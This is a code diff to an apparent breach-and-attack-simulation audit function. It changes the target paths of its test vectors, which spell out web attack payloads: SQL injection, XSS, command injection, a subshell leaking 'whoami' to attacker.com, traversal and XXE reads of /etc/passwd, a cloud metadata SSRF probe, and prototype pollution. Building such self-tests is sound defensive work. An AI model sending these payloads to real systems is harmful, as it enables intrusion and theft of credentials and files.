@@ -227,21 +227,21 @@ def run_bas_audit(current_user: dict = Depends(get_current_user)):
     """
     # Comprehensive simulation battery
     test_vectors = [
-        ("SQL Injection (Union Select)", "GET", "/api/v1/auth/login?id=1%20UNION%20SELECT%20*%20FROM%20users--", "web_api"),
-        ("SQL Injection (Boolean Tautology in JSON)", "POST", "/api/v1/auth/login (body: {'user': 'admin\' OR 1=1--'})", "web_api"),
-        ("SQL Comment Evasion (UN/**/ION)", "GET", "/api/v1/items?filter=UN/**/ION/**/SEL/**/ECT", "web_api"),
-        ("Cross-Site Scripting (Inline Tag)", "GET", "/search?q=<script>alert(1)</script>", "web_api"),
-        ("Cross-Site Scripting (SVG Event)", "POST", "/feedback (body: '<svg/onload=alert(1)>')", "web_api"),
-        ("OS Command Injection (Pipe)", "POST", "/tools (body: {'cmd': '8.8.8.8 | whoami'})", "web_api"),
-        ("Subshell Command Substitution", "GET", "/lookup?host=$(whoami).attacker.com", "web_api"),
-        ("Local File Inclusion (Path Traversal)", "GET", "/file?path=../../../../etc/passwd", "web_api"),
-        ("Double-Encoded Directory Traversal", "GET", "/file?path=..%252f..%252fetc%252fpasswd", "web_api"),
-        ("SSRF Cloud IMDS Exfiltration", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", "exploitation"),
-        ("Server-Side Template Injection (SSTI)", "GET", "/render?template={{7*7}}", "web_api"),
-        ("XML External Entity (XXE)", "POST", "/xml (body: '<!DOCTYPE foo [<!ENTITY x SYSTEM \"file:///etc/passwd\">]')", "web_api"),
-        ("Automated Scanner Probe (sqlmap)", "GET", "/api/v1/data (User-Agent: sqlmap/1.7#stable)", "reconnaissance"),
+        ("SQL Injection (Union Select)", "GET", "/api/auth/login?id=1%20UNION%20SELECT%20*%20FROM%20users--", "web_api"),
+        ("SQL Injection (Boolean Tautology in JSON)", "POST", "/api/auth/login (body: {'user': 'admin\' OR 1=1--'})", "web_api"),
+        ("SQL Comment Evasion (UN/**/ION)", "GET", "/api/threat-intel?filter=UN/**/ION/**/SEL/**/ECT", "web_api"),
+        ("Cross-Site Scripting (Inline Tag)", "GET", "/api/search?q=<script>alert(1)</script>", "web_api"),
+        ("Cross-Site Scripting (SVG Event)", "POST", "/api/feedback (body: '<svg/onload=alert(1)>')", "web_api"),
+        ("OS Command Injection (Pipe)", "POST", "/api/tools (body: {'cmd': '8.8.8.8 | whoami'})", "web_api"),
+        ("Subshell Command Substitution", "GET", "/api/lookup?host=$(whoami).attacker.com", "web_api"),
+        ("Local File Inclusion (Path Traversal)", "GET", "/api/download?file=../../../../etc/passwd", "web_api"),
+        ("Double-Encoded Directory Traversal", "GET", "/api/file?path=..%252f..%252fetc%252fpasswd", "web_api"),
+        ("SSRF Cloud IMDS Exfiltration", "GET", "/api/fetch?url=http://169.254.169.254/latest/meta-data/", "exploitation"),
+        ("Server-Side Template Injection (SSTI)", "GET", "/api/render?template={{7*7}}", "web_api"),
+        ("XML External Entity (XXE)", "POST", "/api/xml (body: '<!DOCTYPE foo [<!ENTITY x SYSTEM \"file:///etc/passwd\">]')", "web_api"),
+        ("Automated Scanner Probe (sqlmap)", "GET", "/api/data (User-Agent: sqlmap/1.7#stable)", "reconnaissance"),
         ("Sensitive Honeypot Probe (/.env)", "GET", "/.env", "reconnaissance"),
-        ("JavaScript Prototype Pollution", "POST", "/settings (body: {'__proto__': {'admin': true}})", "web_api"),
+        ("JavaScript Prototype Pollution", "POST", "/api/settings (body: {'__proto__': {'admin': true}})", "web_api"),
     ]
 
     results = []
